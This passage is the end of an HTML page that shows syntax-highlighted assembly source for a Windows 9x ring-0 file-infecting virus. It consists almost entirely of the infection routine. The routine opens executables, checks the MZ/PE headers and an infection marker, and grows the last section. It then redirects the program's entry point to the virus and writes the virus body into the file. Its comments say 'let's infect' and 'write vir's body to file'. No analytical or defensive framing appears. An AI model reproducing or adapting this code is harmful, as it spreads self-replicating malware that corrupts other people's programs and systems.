</span><span class="sc5">@eee</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">012345678h</span><span class="sc0">
</span><span class="sc5">_fileHandle</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@r0fIO</span><span class="sc0">
          </span><span class="sc6">popa</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">          
</span><span class="sc1">;------------------------( open file - let's infect )---------------------</span><span class="sc0">
</span><span class="sc5">@tryInfect</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_dead</span><span class="sc4">],</span><span class="sc2">0deadh</span><span class="sc0">
          </span><span class="sc6">pusha</span><span class="sc0">
          
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                  </span><span class="sc1">;delta offset in esi</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileName</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">010h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@noPath</span><span class="sc0">
          
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
          </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">@noPath</span><span class="sc4">:</span><span class="sc0">                      
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                        </span><span class="sc1">;nothing 2 say,...</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">01ch</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_UNI2BCS</span><span class="sc0">

          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@vxd</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">010h</span><span class="sc0">

          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">          </span><span class="sc1">;ASCII -&gt; ASCIIZ</span><span class="sc0">
          
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">                  </span><span class="sc1">;change handle / pointer 2 end of name</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_mask</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_checkSize</span><span class="sc0">            </span><span class="sc1">;well, it's bcoz of file i want 2 infect</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">         
          </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                       </span><span class="sc1">;delta offset in edi</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@eou1</span><span class="sc0">

          
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileName</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;let's infect</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                  
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_r0_open</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@r0fIO</span><span class="sc0">
          </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@eou1</span><span class="sc0">

          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;filehandle</span><span class="sc0">

          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_buffer</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_bufSize</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@read</span><span class="sc0">

          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc12">'ZM'</span><span class="sc0">                 </span><span class="sc1">;check EXE</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@closeIT</span><span class="sc0"> 
          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">038h</span><span class="sc4">],</span><span class="sc12">'TM'</span><span class="sc0">          </span><span class="sc1">;check infection flag</span><span class="sc0">
          </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@closeIT</span><span class="sc0">                             </span><span class="sc1">;i no it's stupid</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">
        
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">038h</span><span class="sc4">],</span><span class="sc12">'TM'</span><span class="sc0">          </span><span class="sc1">;set inf.flag</span><span class="sc0">
          
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_bufSize</span><span class="sc0">
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@write</span><span class="sc0">
          
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                  </span><span class="sc1">;possition of PE header</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_bufSize</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@read</span><span class="sc0">                    </span><span class="sc1">;&amp; read it</span><span class="sc0">

          </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc12">'EP'</span><span class="sc0">
          </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@closeIT</span><span class="sc0">
          
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                  </span><span class="sc1">;save PE position</span><span class="sc0">

          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;number of secs</span><span class="sc0">
          </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">
          </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">078h</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                       </span><span class="sc1">;read last section header</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                      </span><span class="sc1">;last section position</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_lastSec</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@read</span><span class="sc0">
          
          </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                   </span><span class="sc1">;and align,...</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_virtSize</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_vSize</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_buffer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">038h</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_virtSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_physSize</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_vSize</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_buffer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">03ch</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
          </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_physSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
          </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">;increase RAW size</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_buffer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">;number of bytes to write into file</span><span class="sc0">

          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_virtOffs</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;set old&amp;new IP</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_buffer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">028h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
          
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_buffer</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">034h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;add image base</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_oldIP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">             </span><span class="sc1">;old phys size</span><span class="sc0">
          </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_physOffs</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">@mm</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@write</span><span class="sc0">                   </span><span class="sc1">;write vir's body to file</span><span class="sc0">

          </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_flags</span><span class="sc4">],</span><span class="sc2">0a0000020h</span><span class="sc0">
          
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_lastSec</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@write</span><span class="sc0">
          
          </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">_bufSize</span><span class="sc0">
          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_buffer</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@write</span><span class="sc0">

</span><span class="sc5">@closeIT</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_r0_close</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_fileHandle</span><span class="sc4">]</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@r0fIO</span><span class="sc0">

</span><span class="sc5">@eou1</span><span class="sc4">:</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">_dead</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
          </span><span class="sc6">popa</span><span class="sc0">
          </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">@endOfIT</span><span class="sc0">            </span><span class="sc9">label</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">@mm</span><span class="sc0">
</span></div></body>
</html>
